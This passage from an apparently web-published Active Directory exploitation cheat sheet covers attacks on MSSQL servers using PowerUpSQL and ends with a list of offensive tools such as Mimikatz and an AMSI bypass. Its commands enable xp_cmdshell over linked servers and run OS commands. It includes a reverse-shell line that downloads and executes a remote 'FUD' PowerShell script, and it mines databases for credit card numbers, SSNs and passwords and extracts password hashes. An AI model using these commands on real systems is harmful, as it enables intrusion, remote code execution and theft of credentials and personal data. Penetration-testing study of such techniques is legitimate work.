#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='315'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1097' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#list-sql-servers-using-a-specific-domain-account)List SQL Servers using a specific domain account

Get-SQLInstanceDomain  -Verbose -DomainAccount SQLSvc

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='316'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1102' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#list-shared-domain-user-sql-server-service-accounts)List shared domain user SQL Server service accounts

Get-SQLInstanceDomain  -Verbose |  Group-Object DomainAccount |  Sort-Object count -Descending | select Count,Name |  Where-Object {($_.name  -notlike  "*$") -and ($_.count  -gt  1) }

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='317'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1126' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#authenticating-to-a-known-sql-server-instance-as-the-current-domain-user)Authenticating to a known SQL Server instance as the current domain user.

Get-SQLQuery  -Verbose -Instance "10.2.2.5,1433"

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='318'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1134' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#authenticating-to-a-known-sql-server-instance-using-a-sql-server-login)Authenticating to a known SQL Server instance using a SQL Server login.

# Server and Instance NameGet-SQLQuery  -Verbose -Instance "servername\instancename"  -username testuser -password testpass# IP and Instance NameGet-SQLQuery  -Verbose -Instance "10.2.2.5\instancename"  -username testuser -password testpass# IP and PortGet-SQLQuery  -Verbose -Instance "10.2.2.5,1433"  -username testuser -password testpass

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='319'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1163' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#get-general-server-information-such-as-sqlos-versions-service-accounts-sysdmin-access-etc)Get general server information such as SQL/OS versions, service accounts, sysdmin access etc.

Get-SQLServerInfo  -Verbose -Instance SQLServer1\Instance1#$ServerInfo  =  Get-SQLInstanceDomain  |  Get-SQLServerInfoThreaded  -Verbose -Threads 10$ServerInfo

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='320'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1178' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#get-an-inventory-of-common-objects-from-the-remote-server-including-permissions-databases-tables-views-etc-and-dump-them-out-into-csv-files)Get an inventory of common objects from the remote server including permissions, databases, tables, views etc, and dump them out into CSV files.

Invoke-SQLDumpInfo  -Verbose -Instance Server1\Instance1

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='321'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1183' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#audit-for-issues)Audit for Issues

Invoke-SQLAudit  -Verbose -Instance SQLServer1

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='322'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1188' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#execute-os-commands-agent-job---powershell)Execute OS commands: Agent Job - PowerShell

$Targets  |  Invoke-SQLOSCmdAgentJob  -Verbose -SubSystem PowerShell -Command 'write-output "hello world" | out-file c:\windows\temp\test2.txt'  -Sleep 20

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='323'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1201' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#xp_cmdshell-v1)Xp_cmdshell v1

Get-SQLServerLinkCrawl  -Instance db-mssql -Query "sp_configure 'show advanced options', '1'"Get-SQLServerLinkCrawl  -Instance db-mssql -Query "RECONFIGURE"Get-SQLServerLinkCrawl  -Instance db-mssql -Query "sp_configure 'xp_cmdshell', '1'"Get-SQLServerLinkCrawl  -Instance db-mssql -Query "RECONFIGURE"

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='324'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1231' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#xp_cmdshell-v2)Xp_cmdshell v2

Get-SQLQuery  -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "msqlsrv.domain.local"'

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='325'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1242' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#xp_cmdshell-v3)Xp_cmdshell v3

Get-SQLServerLinkCrawl  -Instance DOMAIN\SQLEXPRESS 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "msqlsrv.domain.local"'

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='326'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1253' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#osql-xp_cmdshell)OSQL Xp_cmdshell

osql -E -S "db-mssql"  -Q "EXECUTE('sp_configure ''xp_cmdshell'',1;RECONFIGURE;') AT [msqlsrv.domain.local]"

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='327'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1264' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#executing-commands)Executing Commands

Get-SQLServerLinkCrawl  -Instance db-mssql -Query "exec master..xp_cmdshell "whoami'"

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='328'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1275' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#reverse-shell)Reverse shell

Get-SQLServerLinkCrawl  -Instance db-mssql -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10:1433/revshell_FUD.ps1'')"'

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='329'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1286' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#data-mining)Data mining

Get-SQLInstanceDomain | Get-SQLConnectionTest | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10  -Keyword "credit,ssn,password"  -SampleSize 2  -ValidateCC -NoDefaults

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='330'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1302' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#check-files)Check files

Get-SQLInstanceDomain | Get-SQLConnectionTest | Get-SQLDatabaseThreaded -Verbose -Threads 10  -NoDefaults | Where-Object {$_.is_encrypted  -eq "TRUE"} | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10  -Keyword "card, password"  -SampleSize 2  -ValidateCC -NoDefaults

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='331'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1331' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#extracting-sql-server-login-password-hashes)Extracting SQL Server Login password hashes

Get-SQLServerPasswordHash -Verbose -Instance MSSQLSERVER2016\db-mssql -Migrate

## **Active Directory Exploitation Tools**

#### [ADACLScanner](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/ADACLScanner)

#### [ASREPRoast](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/ASREPRoast)

#### [Adduser-c](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/Adduser-c)

#### [AmsiScanBufferBypass](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/AmsiScanBufferBypass)

#### [BeRoot](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/BeRoot)

#### [DAMP-master](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/DAMP-master)

#### [Deploy-Deception-master](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/Deploy-Deception-master)

#### [Find-PS-WMI](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/Find-PS-WMI)

#### [GhostPack](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/GhostPack)

#### [HFS](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/HFS)

#### [HeidiSQL](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/HeidiSQL)

#### [Invoke-Obfuscation](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/Invoke-Obfuscation)

#### [Invoke-SDPropagator](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/Invoke-SDPropagator)

#### [Kekeo](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/Kekeo)

#### [Mimikatz](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/Mimikatz)

#### [NetCease](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/NetCease)

#### [PowerSploit-Dev](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/PowerSploit-Dev)

#### [PowerSploit-Master](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/PowerSploit-Master)

#### [PowerUpSQL](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/PowerUpSQL)

#### [Powercat](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/Powercat)

#### [Powerless](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/Powerless)

#### [Powermad](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/Powermad)

#### [Privesc-master](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/Privesc-master)

#### [PsTools](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/PsTools)

#### [Python-pty-shells](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/Python-pty-shells)

#### [RSAT](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/RSAT)

#### [SessionGopher](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/SessionGopher)

#### [Set-DCShadow](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/Set-DCShadow)

#### [SharpHound](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/Z%20-%20Tool%20Box/SharpHound)

##

##

##

 [  ![](data:image/svg+xml,%3csvg aria-hidden='true' focusable='false' role='presentation' xmlns='http://www.w3.org/2000/svg' width='8' height='6' viewBox='0 0 8 6' data-evernote-id='336' class='js-evernote-checked'%3e %3cg fill='currentColor' fill-rule='evenodd' data-evernote-id='1383' class='js-evernote-checked'%3e %3cpolygon class='icon-chevron-down-left js-evernote-checked' points='4 5.371 7.668 1.606 6.665 .629 4 3.365' data-evernote-id='1384'%3e%3c/polygon%3e %3cpolygon class='icon-chevron-down-right js-evernote-checked' points='4 3.365 1.335 .629 1.335 .629 .332 1.606 4 5.371' data-evernote-id='1385'%3e%3c/polygon%3e %3c/g%3e %3c/svg%3e)     Previous article * Anti-Ransomware Checklist for APT Level Attacks - Ethical Hackers Academy *](https://ethicalhackersacademy.com/blogs/ethical-hackers-academy/anti-ransomware-checklist)

 [ Next article * Most Important Kali Linux Commands | A-Z Commands *      ![](data:image/svg+xml,%3csvg aria-hidden='true' focusable='false' role='presentation' xmlns='http://www.w3.org/2000/svg' width='8' height='6' viewBox='0 0 8 6' data-evernote-id='337' class='js-evernote-checked'%3e %3cg fill='currentColor' fill-rule='evenodd' data-evernote-id='1391' class='js-evernote-checked'%3e %3cpolygon class='icon-chevron-down-left js-evernote-checked' points='4 5.371 7.668 1.606 6.665 .629 4 3.365' data-evernote-id='1392'%3e%3c/polygon%3e %3cpolygon class='icon-chevron-down-right js-evernote-checked' points='4 3.365 1.335 .629 1.335 .629 .332 1.606 4 5.371' data-evernote-id='1393'%3e%3c/polygon%3e %3c/g%3e %3c/svg%3e)](https://ethicalhackersacademy.com/blogs/ethical-hackers-academy/kali-linux-commands)